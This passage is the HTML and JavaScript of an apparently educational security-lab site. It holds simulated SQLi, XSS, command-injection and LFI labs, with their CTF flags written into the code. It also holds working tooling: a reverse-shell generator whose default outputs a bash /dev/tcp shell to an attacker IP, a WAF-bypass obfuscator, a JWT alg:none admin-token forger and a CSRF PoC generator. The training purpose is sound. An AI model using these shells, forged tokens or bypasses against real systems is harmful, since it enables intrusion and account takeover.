        <div class="interactive-sandbox-card sandbox-item" data-category="network" style="margin-top:2rem;">
          <div class="sandbox-card-header">
            <div class="sandbox-badge">LAB #10 • NETWORK SEC</div>
            <h3>🛰️ Interactive Nmap Command Generator & Flag Engine</h3>
            <p class="sandbox-sub">Configure network scan parameters visually and generate optimized Nmap terminal commands with explanations.</p>
          </div>
          <div class="sandbox-body">
            <div class="form-group" style="margin-bottom: 1.2rem;">
              <label>Target IP / Hostname:</label>
              <input type="text" id="nmap-target" value="10.10.10.254" class="search-input">
            </div>
            <div class="nmap-options-grid">
              <label class="nmap-check"><input type="checkbox" id="nmap-sS" checked> <span>-sS (SYN Stealth Scan)</span></label>
              <label class="nmap-check"><input type="checkbox" id="nmap-sV" checked> <span>-sV (Service Version Detection)</span></label>
              <label class="nmap-check"><input type="checkbox" id="nmap-sC" checked> <span>-sC (Default Safe Scripts)</span></label>
              <label class="nmap-check"><input type="checkbox" id="nmap-A"> <span>-A (Aggressive OS & Traceroute)</span></label>
              <label class="nmap-check"><input type="checkbox" id="nmap-p"> <span>-p- (Scan All 65535 Ports)</span></label>
              <label class="nmap-check"><input type="checkbox" id="nmap-Pn"> <span>-Pn (Treat all hosts as online)</span></label>
              <label class="nmap-check"><input type="checkbox" id="nmap-vuln"> <span>--script=vuln (Scan CVE Flaws)</span></label>
              <label class="nmap-check"><input type="checkbox" id="nmap-T4" checked> <span>-T4 (Aggressive Timing)</span></label>
            </div>
            <div class="nmap-output-card" style="margin-top: 1.5rem;">
              <div class="nmap-cmd-text" id="nmap-generated-cmd">nmap -sS -sV -sC -T4 10.10.10.254</div>
              <button class="btn btn-secondary" id="btn-copy-nmap" style="padding: 0.45rem 1rem; font-size: 0.75rem;">Copy Command</button>
            </div>
          </div>
        </div>

        <!-- LAB 11: Subnet & CIDR Recon Calculator -->
        <div class="interactive-sandbox-card sandbox-item" data-category="network" style="margin-top:2rem;">
          <div class="sandbox-card-header">
            <div class="sandbox-badge">LAB #11 • NETWORK SEC</div>
            <h3>🌐 Network Recon & Subnet CIDR Calculator</h3>
            <p class="sandbox-sub">Calculate network ranges, broadcast addresses, and discover usable target IP blocks for pentesting.</p>
          </div>
          <div class="sandbox-body">
            <div class="form-group"><label>Target Subnet (CIDR format):</label><input type="text" id="cidr-input" value="192.168.1.0/24" class="search-input"></div>
            <div class="contact-specs" style="margin-top: 1rem;">
              <div class="spec-item"><span class="spec-label">NETWORK IP</span><span class="spec-val" id="sub-net" style="color:var(--neon-purple-bright);">192.168.1.0</span></div>
              <div class="spec-item"><span class="spec-label">USABLE RANGE</span><span class="spec-val" id="sub-range" style="color:var(--neon-green);">192.168.1.1 - 192.168.1.254</span></div>
              <div class="spec-item"><span class="spec-label">BROADCAST IP</span><span class="spec-val" id="sub-bcast" style="color:var(--neon-yellow);">192.168.1.255</span></div>
              <div class="spec-item"><span class="spec-label">TOTAL HOSTS</span><span class="spec-val" id="sub-hosts" style="color:var(--neon-cyan);">254 Usable (256 Total)</span></div>
            </div>
          </div>
        </div>

        <!-- LAB 12: HTTP Security Headers Auditor -->
        <div class="interactive-sandbox-card sandbox-item" data-category="web" style="margin-top:2rem;">
          <div class="sandbox-card-header">
            <div class="sandbox-badge">LAB #12 • WEB & RECON</div>
            <h3>🔍 HTTP Security Headers Auditor & Hardening Analyzer</h3>
            <p class="sandbox-sub">Paste raw HTTP response headers to audit defensive headers (CSP, HSTS, X-Frame-Options, CORS) and calculate a hardening score.</p>
          </div>
          <div class="sandbox-body">
            <div class="form-group"><label>Paste HTTP Response Headers:</label><textarea id="headers-input" class="search-input" style="height:90px;font-family:var(--font-mono);font-size:0.8rem;">HTTP/1.1 200 OK\nServer: nginx\nContent-Type: text/html\nStrict-Transport-Security: max-age=31536000</textarea></div>
            <div style="margin-top:1rem;"><button class="btn btn-primary" id="btn-audit-headers">▶ Analyze Security Headers</button></div>
            <div class="sandbox-terminal" style="margin-top: 1.25rem;">
              <div class="terminal-header"><div class="terminal-dots"><span class="dot-red"></span><span class="dot-yellow"></span><span class="dot-green"></span></div><div class="terminal-title">security_headers_audit_report.log</div></div>
              <div class="terminal-content" id="headers-output"><div class="terminal-line"><span class="cmd-info">[i] Click 'Analyze' to inspect CSP, HSTS, and X-Frame-Options defense status.</span></div></div>
            </div>
          </div>
        </div>

        <!-- LAB 13: Reverse Shell One-Liner Generator -->
        <div class="interactive-sandbox-card sandbox-item" data-category="system" style="margin-top:2rem;">
          <div class="sandbox-card-header">
            <div class="sandbox-badge">LAB #13 • EXPLOITATION</div>
            <h3>🔑 Weaponized Reverse Shell One-Liner Generator</h3>
            <p class="sandbox-sub">Generate instant, syntax-tested reverse shell one-liners for Netcat, Bash, Python, PHP, PowerShell, and Socat.</p>
          </div>
          <div class="sandbox-body">
            <div class="sandbox-form-grid">
              <div class="form-group"><label>Attacker LHOST (IP / Tun0):</label><input type="text" id="rev-ip" value="10.10.14.5" class="search-input"></div>
              <div class="form-group"><label>Attacker LPORT (Port):</label><input type="text" id="rev-port" value="4444" class="search-input"></div>
            </div>
            <div class="form-group" style="margin-top:1rem;">
              <label>Target Language / Shell Type:</label>
              <select id="rev-lang" class="search-input">
                <option value="bash">Bash (-i >& /dev/tcp)</option>
                <option value="python">Python 3 Socket</option>
                <option value="nc">Netcat (mkfifo)</option>
                <option value="php">PHP exec/passthru</option>
                <option value="powershell">PowerShell TCP Client</option>
              </select>
            </div>
            <div class="nmap-output-card" style="margin-top:1.25rem;">
              <div class="nmap-cmd-text" id="rev-output">bash -i >& /dev/tcp/10.10.14.5/4444 0>&1</div>
              <button class="btn btn-secondary" id="btn-copy-rev" style="padding: 0.45rem 1rem; font-size: 0.75rem;">Copy Shell</button>
            </div>
          </div>
        </div>

        <!-- LAB 14: Linux Permission & SUID Calculator -->
        <div class="interactive-sandbox-card sandbox-item" data-category="system" style="margin-top:2rem;">
          <div class="sandbox-card-header">
            <div class="sandbox-badge">LAB #14 • LINUX PRIVILEGE</div>
            <h3>💻 Linux Permissions (chmod) & SUID Privilege Auditor</h3>
            <p class="sandbox-sub">Configure user, group, and other permissions with SUID/SGID bits and evaluate local privilege escalation risks.</p>
          </div>
          <div class="sandbox-body">
            <div class="nmap-options-grid">
              <label class="nmap-check"><input type="checkbox" id="chk-suid" checked> <span>SUID (u+s / 4000) [HIGH RISK]</span></label>
              <label class="nmap-check"><input type="checkbox" id="chk-u-r" checked> <span>User Read (400)</span></label>
              <label class="nmap-check"><input type="checkbox" id="chk-u-w" checked> <span>User Write (200)</span></label>
              <label class="nmap-check"><input type="checkbox" id="chk-u-x" checked> <span>User Exec (100)</span></label>
              <label class="nmap-check"><input type="checkbox" id="chk-g-r" checked> <span>Group Read (040)</span></label>
              <label class="nmap-check"><input type="checkbox" id="chk-g-x" checked> <span>Group Exec (010)</span></label>
              <label class="nmap-check"><input type="checkbox" id="chk-o-r" checked> <span>Others Read (004)</span></label>
              <label class="nmap-check"><input type="checkbox" id="chk-o-x" checked> <span>Others Exec (001)</span></label>
            </div>
            <div class="contact-specs" style="margin-top: 1rem;">
              <div class="spec-item"><span class="spec-label">OCTAL</span><span class="spec-val" id="perm-octal" style="color:var(--neon-purple-bright);">4755</span></div>
              <div class="spec-item"><span class="spec-label">SYMBOLIC</span><span class="spec-val" id="perm-symbolic" style="color:var(--neon-cyan);">-rwsr-xr-x</span></div>
              <div class="spec-item"><span class="spec-label">SECURITY AUDIT</span><span class="spec-val" id="perm-risk" style="color:var(--neon-red);">SUID Active (GTFOBins Risk)</span></div>
            </div>
          </div>
        </div>

        <!-- LAB 15: WAF Bypass Obfuscator -->
        <div class="interactive-sandbox-card sandbox-item" data-category="web" style="margin-top:2rem;">
          <div class="sandbox-card-header">
            <div class="sandbox-badge">LAB #15 • WAF BYPASS</div>
            <h3>🛡️ WAF (Web Application Firewall) Bypass & Obfuscator</h3>
            <p class="sandbox-sub">Transform recognizable SQL and XSS strings into obfuscated tamper variations designed to bypass naive regex firewalls.</p>
          </div>
          <div class="sandbox-body">
            <div class="form-group"><label>Base Payload to Obfuscate:</label><input type="text" id="waf-input" value="" class="search-input" placeholder="Enter SQL or XSS payload to obfuscate..."></div>
            <div class="encoder-results-grid" style="margin-top:1rem;">
              <div class="encoder-box"><div class="enc-label">INLINE COMMENT OBFUSCATION (/**/)</div><div class="enc-val" id="waf-comments">...</div><button class="btn-copy-enc" data-target="waf-comments">Copy</button></div>
              <div class="encoder-box"><div class="enc-label">CASE RANDOMIZATION</div><div class="enc-val" id="waf-case">...</div><button class="btn-copy-enc" data-target="waf-case">Copy</button></div>
              <div class="encoder-box"><div class="enc-label">DOUBLE URL ENCODING</div><div class="enc-val" id="waf-double-url">...</div><button class="btn-copy-enc" data-target="waf-double-url">Copy</button></div>
              <div class="encoder-box"><div class="enc-label">HEX STRING LITERALS</div><div class="enc-val" id="waf-hex">...</div><button class="btn-copy-enc" data-target="waf-hex">Copy</button></div>
            </div>
          </div>
        </div>

        <!-- LAB 16: Caesar Cipher Brute-Forcer -->
        <div class="interactive-sandbox-card sandbox-item" data-category="crypto" style="margin-top:2rem;">
          <div class="sandbox-card-header">
            <div class="sandbox-badge">LAB #16 • CRYPTOGRAPHY</div>
            <h3>🔓 Caesar Cipher & Rot-N Brute-Force Solver</h3>
            <p class="sandbox-sub">Simultaneously compute all 25 possible rotational cipher shifts to rapidly decrypt intercepted CTF messages.</p>
          </div>
          <div class="sandbox-body">
            <div class="form-group"><label>Ciphertext to Decrypt:</label><input type="text" id="rot-input" value="Erghkdo Hashoruhuv Fbihevhhxulwb" class="search-input"></div>
            <div class="sandbox-terminal" style="margin-top: 1.25rem;">
              <div class="terminal-header"><div class="terminal-dots"><span class="dot-red"></span><span class="dot-yellow"></span><span class="dot-green"></span></div><div class="terminal-title">rot_all_permutations_engine.log</div></div>
              <div class="terminal-content" id="rot-output" style="max-height: 180px;"><div class="terminal-line"><span class="cmd-info">[i] Shifting text across all Rot-N iterations...</span></div></div>
            </div>
          </div>
        </div>

        <!-- LAB 17: Base64 File & Magic Byte Inspector -->
        <div class="interactive-sandbox-card sandbox-item" data-category="crypto" style="margin-top:2rem;">
          <div class="sandbox-card-header">
            <div class="sandbox-badge">LAB #17 • FORENSICS</div>
            <h3>📦 Magic Byte & File Signature Inspector</h3>
            <p class="sandbox-sub">Paste Base64 or Hex file data to identify file formats (ELF, PE EXE, ZIP, PNG, PDF) by inspecting magic signature headers.</p>
          </div>
          <div class="sandbox-body">
            <div class="form-group"><label>Base64 / Hex File Header Data:</label><input type="text" id="magic-input" value="TVqQAAMAAAAEAAAA" class="search-input"></div>
            <div class="payload-quick-buttons">
              <span class="quick-label">SAMPLES:</span>
              <button class="btn-quick-payload" data-target="magic-input" data-payload="TVqQAAMAAAAEAAAA">Windows EXE (MZ)</button>
              <button class="btn-quick-payload" data-target="magic-input" data-payload="f0VMRgEBAQAAAAAA">Linux Binary (ELF)</button>
              <button class="btn-quick-payload" data-target="magic-input" data-payload="UEsDBBQAAAAIAAA">ZIP / DOCX (PK)</button>
              <button class="btn-quick-payload" data-target="magic-input" data-payload="iVBORw0KGgoAAAANSU">PNG Image</button>
            </div>
            <div class="contact-specs" style="margin-top: 1rem;">
              <div class="spec-item"><span class="spec-label">DETECTED FORMAT</span><span class="spec-val" id="magic-format" style="color:var(--neon-green);">Windows Portable Executable (.EXE / .DLL)</span></div>
              <div class="spec-item"><span class="spec-label">MAGIC BYTES (HEX)</span><span class="spec-val" id="magic-hex" style="color:var(--neon-cyan);">4D 5A (MZ)</span></div>
              <div class="spec-item"><span class="spec-label">RISK LEVEL</span><span class="spec-val" id="magic-risk" style="color:var(--neon-red);">High Risk Executable</span></div>
            </div>
          </div>
        </div>

        <!-- LAB 18: Hash Identifier & Entropy Analyzer -->
        <div class="interactive-sandbox-card sandbox-item" data-category="crypto" style="margin-top:2rem;">
          <div class="sandbox-card-header">
            <div class="sandbox-badge">LAB #18 • CRYPTO & OSINT</div>
            <h3>🕵️ Hash Type Identifier & Shannon Entropy Analyzer</h3>
            <p class="sandbox-sub">Analyze unknown hash strings to identify candidate cryptographic algorithms (MD5, SHA1, SHA256, NTLM, bcrypt) and calculate entropy.</p>
          </div>
          <div class="sandbox-body">
            <div class="form-group"><label>Unknown Hash String:</label><input type="text" id="hash-id-input" value="e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855" class="search-input"></div>
            <div class="contact-specs" style="margin-top: 1rem;">
              <div class="spec-item"><span class="spec-label">LENGTH</span><span class="spec-val" id="hash-len">64 chars (256 bits)</span></div>
              <div class="spec-item"><span class="spec-label">MOST PROBABLE ALGORITHM</span><span class="spec-val" id="hash-candidate" style="color:var(--neon-purple-bright);">SHA-256 / SHA3-256</span></div>
              <div class="spec-item"><span class="spec-label">SHANNON ENTROPY</span><span class="spec-val" id="hash-entropy" style="color:var(--neon-green);">3.92 (High Randomness)</span></div>
            </div>
          </div>
        </div>

        <!-- LAB 19: DNS & WHOIS Recon Query Simulator -->
        <div class="interactive-sandbox-card sandbox-item" data-category="network" style="margin-top:2rem;">
          <div class="sandbox-card-header">
            <div class="sandbox-badge">LAB #19 • OSINT & RECON</div>
            <h3>🌐 DNS & WHOIS Reconnaissance Query Simulator</h3>
            <p class="sandbox-sub">Query simulated DNS zone files and WHOIS domain records to gather domain infrastructure intelligence.</p>
          </div>
          <div class="sandbox-body">
            <div class="sandbox-form-grid">
              <div class="form-group"><label>Target Domain Name:</label><input type="text" id="dns-target" value="ethicalexplorers.github.io" class="search-input"></div>
              <div class="form-group"><label>Record Type:</label><select id="dns-type" class="search-input"><option value="ALL">ALL (Full Zone Transfer / Dig)</option><option value="A">A Record (IPv4 Address)</option><option value="MX">MX Record (Mail Exchange)</option><option value="TXT">TXT (SPF / DKIM Security)</option></select></div>
            </div>
            <div style="margin-top:1rem;"><button class="btn btn-primary" id="btn-run-dns">▶ Execute DNS Dig Query</button></div>
            <div class="sandbox-terminal" style="margin-top: 1.25rem;">
              <div class="terminal-header"><div class="terminal-dots"><span class="dot-red"></span><span class="dot-yellow"></span><span class="dot-green"></span></div><div class="terminal-title">dig_dns_query_output.log</div></div>
              <div class="terminal-content" id="dns-output"><div class="terminal-line"><span class="cmd-info">[i] Click 'Execute DNS Dig Query' to resolve zone records.</span></div></div>
            </div>
          </div>
        </div>

        <!-- LAB 20: Multi-Stage CTF Cryptography Challenge Room -->
        <div class="interactive-sandbox-card sandbox-item" data-category="crypto" style="margin-top:2rem; border-color:var(--neon-purple-bright);">
          <div class="sandbox-card-header">
            <div class="sandbox-badge" style="background:rgba(0,255,65,0.15);color:var(--neon-green);border-color:var(--neon-green);">LAB #20 • CTF CHALLENGE ROOM</div>
            <h3>🎯 Multi-Stage Cryptography & Cipher Flag Challenge</h3>
            <p class="sandbox-sub">Decode the multi-layer cipher (Binary -> Base64 -> Caesar Shift) and submit the final flag to earn your Master Explorer Badge!</p>
          </div>
          <div class="sandbox-body">
            <div style="background:rgba(5,5,20,0.9);padding:1rem;border-radius:8px;border:1px solid var(--border-color);margin-bottom:1rem;">
              <div style="font-family:var(--font-mono);font-size:0.75rem;color:var(--text-muted);margin-bottom:4px;">CIPHERTEXT CLUE:</div>
              <code style="color:var(--neon-cyan);word-break:break-all;font-size:0.85rem;">RVV7U1VQRVJfQ1lCRVJfSEFDS0VSXzIwMjZ9</code>
            </div>
            <div class="form-group">
              <label>Submit Decoded Flag:</label>
              <input type="text" id="ctf-flag-input" placeholder="EE{...}" class="search-input">
            </div>
            <div style="margin-top:1rem;"><button class="btn btn-primary" id="btn-submit-flag">🏁 Verify Flag & Capture Badge</button></div>
            <div class="sandbox-terminal" style="margin-top: 1.25rem;">
              <div class="terminal-header"><div class="terminal-dots"><span class="dot-red"></span><span class="dot-yellow"></span><span class="dot-green"></span></div><div class="terminal-title">ctf_validator_daemon.log</div></div>
              <div class="terminal-content" id="ctf-output"><div class="terminal-line"><span class="cmd-info">[i] Decode the clue above and submit your flag.</span></div></div>
            </div>
          </div>
        </div>

      </div>
    </div>
  `;

  // Setup category filtering for sandboxes
  setupSandboxFilters();

  // Setup quick payload buttons
  document.querySelectorAll('.btn-quick-payload').forEach(btn => {
    btn.addEventListener('click', () => {
      const targetId = btn.dataset.target;
      const targetEl = document.getElementById(targetId);
      if (targetEl) {
        targetEl.value = btn.dataset.payload;
        // Trigger specific change event
        targetEl.dispatchEvent(new Event('input'));
      }
    });
  });

  // Setup copy buttons
  document.querySelectorAll('.btn-copy-enc').forEach(btn => {
    btn.addEventListener('click', () => {
      const targetId = btn.dataset.target;
      const text = document.getElementById(targetId)?.textContent;
      if (text) {
        navigator.clipboard.writeText(text);
        showToast('Payload copied to clipboard!');
      }
    });
  });

  // Initialize Lab Scoring & Rank System
  updateLabScoreUI();

  // Initialize all 20 Sandboxes
  initSQLiSimulator();
  initXSSSandbox();
  initRCETerminal();
  initBruteForceLab();
  initJWTLab();
  initLFILab();
  initSSTILab();
  initCSRFLab();
  initPayloadEncoder();
  initNmapBuilder();
  initSubnetCalculator();
  initHeadersAuditor();
  initRevShellGenerator();
  initChmodCalculator();
  initWAFObfuscator();
  initRotSolver();
  initMagicBytesLab();
  initHashIdentifier();
  initDNSSimulator();
  initCTFChallengeRoom();
}

// ----------------------------------------------------------------
// LAB SCORING & CTF PROGRESSION SYSTEM
// ----------------------------------------------------------------
function getSolvedLabs() {
  try {
    return JSON.parse(localStorage.getItem('ee_solved_labs') || '[]');
  } catch {
    return [];
  }
}

function updateLabScoreUI() {
  const solved = getSolvedLabs();
  const count = solved.length;
  const score = count * 100;
  const percent = Math.min(100, Math.round((count / 20) * 100));

  let rank = 'Novice Explorer';
  if (count >= 18) rank = 'Elite Master Hacker 👑';
  else if (count >= 14) rank = 'Senior Penetration Tester 🛡️';
  else if (count >= 10) rank = 'Cyber Specialist ⚡';
  else if (count >= 5) rank = 'AppSec Apprentice 🔍';
  else if (count >= 1) rank = 'Junior Explorer 💻';

  const rankEl = document.getElementById('lab-rank-display');
  const countEl = document.getElementById('lab-solved-count');
  const scoreEl = document.getElementById('lab-score-display');
  const fillEl = document.getElementById('lab-progress-fill');
  const percentEl = document.getElementById('lab-progress-percent');

  if (rankEl) rankEl.textContent = rank;
  if (countEl) countEl.textContent = `${count} / 20`;
  if (scoreEl) scoreEl.textContent = `${score} PTS`;
  if (fillEl) fillEl.style.width = `${percent}%`;
  if (percentEl) percentEl.textContent = `${percent}%`;
}

function awardLabPoints(labId, labTitle) {
  const solved = getSolvedLabs();
  if (!solved.includes(labId)) {
    solved.push(labId);
    localStorage.setItem('ee_solved_labs', JSON.stringify(solved));
    updateLabScoreUI();
    showToast(`🏆 LAB SOLVED: ${labTitle}! (+100 PTS)`);
  }
}

// Filter Navigation Handler
function setupSandboxFilters() {
  document.querySelectorAll('.sandbox-category-btn').forEach(btn => {
    btn.addEventListener('click', () => {
      document.querySelectorAll('.sandbox-category-btn').forEach(b => b.classList.remove('active'));
      btn.classList.add('active');

      const filter = btn.dataset.filter;
      document.querySelectorAll('.sandbox-item').forEach(item => {
        if (filter === 'all' || item.dataset.category === filter) {
          item.style.display = 'block';
        } else {
          item.style.display = 'none';
        }
      });
    });
  });
}

// ----------------------------------------------------------------
// ALL 20 INTERACTIVE LAB LOGIC HANDLERS
// ----------------------------------------------------------------

// LAB 1: SQL Injection
function initSQLiSimulator() {
  const userInp = document.getElementById('sqli-user-input');
  const passInp = document.getElementById('sqli-pass-input');
  const btnRun = document.getElementById('btn-run-sqli');
  const termOut = document.getElementById('sqli-terminal-output');
  if (!btnRun || !userInp || !termOut) return;

  btnRun.addEventListener('click', () => {
    const user = userInp.value;
    const pass = passInp.value;
    const rawQuery = `SELECT id, username, role, flag FROM users WHERE username = '${user}' AND password = '${pass}' LIMIT 1;`;
    termOut.innerHTML = `
      <div class="terminal-line"><span class="cmd-info">[+] Executing SQL Query on DB Engine:</span></div>
      <div class="terminal-line" style="color:var(--neon-cyan);"><code>${escapeHtml(rawQuery)}</code></div>
    `;
    setTimeout(() => {
      const isBypassed = user.includes("' OR '1'='1") || user.includes("' OR 1=1") || user.includes("admin' --") || user.includes("UNION SELECT");
      if (isBypassed) {
        awardLabPoints('sqli', 'SQL Injection Auth Bypass');
        termOut.innerHTML += `
          <div class="terminal-line"><span class="cmd-success">[✓] AUTHENTICATION BYPASSED! Evaluated to TRUE.</span></div>
          <div class="terminal-line" style="color:var(--neon-green);font-weight:bold;">[★] DB RECORD RETURNED: User 'admin' (Role: SuperAdmin)</div>
          <div class="terminal-line" style="color:var(--neon-purple-bright);font-weight:bold;">FLAG: EE{SQLi_AUTH_BYPASS_SUCCESSFUL_2026}</div>
        `;
      } else {
        termOut.innerHTML += `
          <div class="terminal-line"><span class="cmd-warn">[!] Authentication Failed: No rows matching credentials.</span></div>
        `;
      }
      termOut.scrollTop = termOut.scrollHeight;
    }, 300);
  });
}

// LAB 2: XSS
function initXSSSandbox() {
  const input = document.getElementById('xss-input');
  const btn = document.getElementById('btn-run-xss');
  const term = document.getElementById('xss-terminal-output');
  if (!btn || !input || !term) return;

  btn.addEventListener('click', () => {
    const val = input.value;
    const hasScript = /<script|onerror|onload|javascript:|eval\(|<svg|<iframe/i.test(val);
    term.innerHTML = `
      <div class="terminal-line"><span class="cmd-info">[+] Input string parsed into DOM context:</span></div>
      <div class="terminal-line" style="color:var(--text-primary);"><code>${escapeHtml(val)}</code></div>
    `;
    setTimeout(() => {
      if (hasScript) {
        awardLabPoints('xss', 'Cross-Site Scripting Sandbox');
        term.innerHTML += `
          <div class="terminal-line"><span class="cmd-success">[✓] EXPLOIT TRIGGERED: Unsanitized script execution detected!</span></div>
          <div class="terminal-line" style="color:var(--neon-yellow);">[!] Vulnerability: Reflected Cross-Site Scripting in search parameter.</div>
          <div class="terminal-line" style="color:var(--neon-purple-bright);">FLAG: EE{XSS_DOM_INJECTION_PWNED_2026}</div>
        `;
      } else {
        term.innerHTML += `<div class="terminal-line"><span class="cmd-warn">[-] No active script tags or event handlers detected in string.</span></div>`;
      }
      term.scrollTop = term.scrollHeight;
    }, 300);
  });
}

// LAB 3: RCE
function initRCETerminal() {
  const input = document.getElementById('rce-input');
  const btn = document.getElementById('btn-run-rce');
  const term = document.getElementById('rce-terminal-output');
  if (!btn || !input || !term) return;

  btn.addEventListener('click', () => {
    const cmd = input.value;
    term.innerHTML = `<div class="terminal-line"><span class="cmd-info">$ ping -c 2 ${escapeHtml(cmd)}</span></div>`;
    setTimeout(() => {
      term.innerHTML += `<div class="terminal-line" style="color:var(--text-secondary);">PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data.</div>`;
      if (cmd.includes(';') || cmd.includes('|') || cmd.includes('&&')) {
        awardLabPoints('rce', 'Command Injection (RCE)');
        term.innerHTML += `
          <div class="terminal-line"><span class="cmd-success">[✓] COMMAND INJECTION SUCCESS! Chained subcommands executed:</span></div>
          <div class="terminal-line" style="color:var(--neon-green);">uid=0(root) gid=0(root) groups=0(root)</div>
          <div class="terminal-line" style="color:var(--neon-cyan);">Linux target-host 5.15.0-generic x86_64 GNU/Linux</div>
          <div class="terminal-line" style="color:var(--neon-purple-bright);font-weight:bold;">FLAG: EE{RCE_SHELL_COMMAND_INJECTION_2026}</div>
        `;
      }
      term.scrollTop = term.scrollHeight;
    }, 400);
  });
}

// LAB 4: Brute Force
function initBruteForceLab() {
  const btn = document.getElementById('btn-run-bf');
  const term = document.getElementById('bf-terminal-output');
  if (!btn || !term) return;

  btn.addEventListener('click', () => {
    term.innerHTML = `<div class="terminal-line"><span class="cmd-info">[+] Launching dictionary attack with 100,000 attempts/sec...</span></div>`;
    const words = ['123456', 'admin', 'welcome', 'qwerty', 'dragon', 'football', 'password', 'monkey', 'shadow', 'kali'];
    let i = 0;
    const interval = setInterval(() => {
      if (i < words.length) {
        term.innerHTML += `<div class="terminal-line" style="color:var(--text-muted);">[-] Attempting: ${words[i]} (Hash mismatch)</div>`;
        term.scrollTop = term.scrollHeight;
        i++;
      } else {
        clearInterval(interval);
        awardLabPoints('bf', 'Hashcat / Hydra Cracker');
        term.innerHTML += `
          <div class="terminal-line"><span class="cmd-success">[✓] HASH CRACKED SUCCESSFULLY!</span></div>
          <div class="terminal-line" style="color:var(--neon-green);font-weight:bold;">[★] Plaintext Password: "password" (Matched in RockYou dictionary)</div>
          <div class="terminal-line" style="color:var(--neon-purple-bright);">FLAG: EE{HASH_CRACKED_ROCKYOU_DICTIONARY}</div>
        `;
        term.scrollTop = term.scrollHeight;
      }
    }, 120);
  });
}

// LAB 5: JWT
function initJWTLab() {
  const jwtInp = document.getElementById('jwt-input');
  const headerOut = document.getElementById('jwt-header');
  const payloadOut = document.getElementById('jwt-payload');
  const btnForge = document.getElementById('btn-forge-jwt');
  const result = document.getElementById('jwt-forged-result');
  if (!jwtInp || !btnForge) return;

  function parseJWT() {
    try {
      const parts = jwtInp.value.split('.');
      if (parts.length >= 2) {
        headerOut.value = JSON.stringify(JSON.parse(atob(parts[0])), null, 2);
        payloadOut.value = JSON.stringify(JSON.parse(atob(parts[1])), null, 2);
      }
    } catch {
      headerOut.value = '{"alg": "HS256", "typ": "JWT"}';
      payloadOut.value = '{"user": "guest", "role": "user"}';
    }
  }

  jwtInp.addEventListener('input', parseJWT);
  parseJWT();

  btnForge.addEventListener('click', () => {
    const forgedHeader = btoa(JSON.stringify({ alg: "none", typ: "JWT" })).replace(/=/g, '');
    const forgedPayload = btoa(JSON.stringify({ user: "admin", role: "SuperAdmin", isAdmin: true })).replace(/=/g, '');
    const forgedToken = `${forgedHeader}.${forgedPayload}.`;
    result.textContent = forgedToken;
    navigator.clipboard.writeText(forgedToken);
    awardLabPoints('jwt', 'JWT None Algorithm Exploit');
    showToast('Forged Admin Token Copied! (alg: none exploit)');
  });
}

// LAB 6: LFI
function initLFILab() {
  const input = document.getElementById('lfi-input');
  const btn = document.getElementById('btn-run-lfi');
  const term = document.getElementById('lfi-terminal-output');
  if (!btn || !input || !term) return;

  btn.addEventListener('click', () => {
    const val = input.value;
    term.innerHTML = `<div class="terminal-line"><span class="cmd-info">[+] Requesting file stream: ${escapeHtml(val)}</span></div>`;
    setTimeout(() => {
      if (val.includes('etc/passwd')) {
        awardLabPoints('lfi', 'Local File Inclusion (LFI)');
        term.innerHTML += `
          <div class="terminal-line" style="color:var(--neon-green);">root:x:0:0:root:/root:/bin/bash</div>
          <div class="terminal-line" style="color:var(--neon-green);">daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin</div>
          <div class="terminal-line" style="color:var(--neon-green);">explorer:x:1000:1000:Ethical Explorers:/home/explorer:/bin/bash</div>
          <div class="terminal-line" style="color:var(--neon-purple-bright);font-weight:bold;">FLAG: EE{LFI_PATH_TRAVERSAL_ETC_PASSWD}</div>
        `;
      } else {
        term.innerHTML += `<div class="terminal-line"><span class="cmd-success">[✓] File stream captured. Size: 1,420 bytes.</span></div>`;
      }
      term.scrollTop = term.scrollHeight;
    }, 300);
  });
}

// LAB 7: SSTI
function initSSTILab() {
  const input = document.getElementById('ssti-input');
  const btn = document.getElementById('btn-run-ssti');
  const term = document.getElementById('ssti-terminal-output');
  if (!btn || !input || !term) return;

  btn.addEventListener('click', () => {
    const val = input.value;
    term.innerHTML = `<div class="terminal-line"><span class="cmd-info">[+] Template Engine Input: ${escapeHtml(val)}</span></div>`;
    setTimeout(() => {
      if (val.includes('7*7')) {
        awardLabPoints('ssti', 'Server-Side Template Injection');
        term.innerHTML += `
          <div class="terminal-line"><span class="cmd-success">[✓] SSTI Confirmed! Expression evaluated: 49</span></div>
          <div class="terminal-line" style="color:var(--neon-cyan);">[+] Template Engine: Jinja2 / Python 3.10</div>
          <div class="terminal-line" style="color:var(--neon-purple-bright);">FLAG: EE{SSTI_TEMPLATE_EXPRESSION_EVAL_49}</div>
        `;
      } else {
        term.innerHTML += `<div class="terminal-line"><span class="cmd-info">[+] Rendered string safely.</span></div>`;
      }
      term.scrollTop = term.scrollHeight;
    }, 300);
  });
}

// LAB 8: CSRF
function initCSRFLab() {
  const btn = document.getElementById('btn-gen-csrf');
  const urlInp = document.getElementById('csrf-url');
  const methodInp = document.getElementById('csrf-method');
  const paramsInp = document.getElementById('csrf-params');
  const out = document.getElementById('csrf-output');
  if (!btn || !urlInp || !out) return;

  btn.addEventListener('click', () => {
    const url = urlInp.value;
    const method = methodInp.value;
    const params = paramsInp.value.split(',').map(p => p.trim());
    let inputsHTML = '';
    params.forEach(p => {
      const [k, v] = p.split('=');
      if (k) inputsHTML += `  &lt;input type="hidden" name="${k.trim()}" value="${(v || '').trim()}" /&gt;\n`;
    });

    const poc = `&lt;html&gt;\n&lt;body&gt;\n&lt;form id="csrfForm" action="${url}" method="${method}"&gt;\n${inputsHTML}&lt;/form&gt;\n&lt;script&gt;document.getElementById('csrfForm').submit();&lt;/script&gt;\n&lt;/body&gt;\n&lt;/html&gt;`;
    awardLabPoints('csrf', 'CSRF PoC Exploit Generator');
    out.innerHTML = `<div class="terminal-line"><span class="cmd-success">[✓] Weaponized CSRF PoC Generated:</span></div><div class="terminal-line" style="color:var(--neon-green);"><pre style="margin:0;background:none;border:none;"><code>${poc}</code></pre></div>`;
  });
}

// LAB 9: Payload Encoder
async function initPayloadEncoder() {
  const input = document.getElementById('encoder-input');
  if (!input) return;

  async function updateEncodings() {
    const text = input.value;
    try { document.getElementById('res-base64').textContent = btoa(unescape(encodeURIComponent(text))); } catch { document.getElementById('res-base64').textContent = 'Error'; }

    let hex = '';
    for (let i = 0; i < text.length; i++) hex += text.charCodeAt(i).toString(16).padStart(2, '0') + ' ';
    document.getElementById('res-hex').textContent = hex.trim() || 'Empty';
    document.getElementById('res-url').textContent = encodeURIComponent(text) || 'Empty';
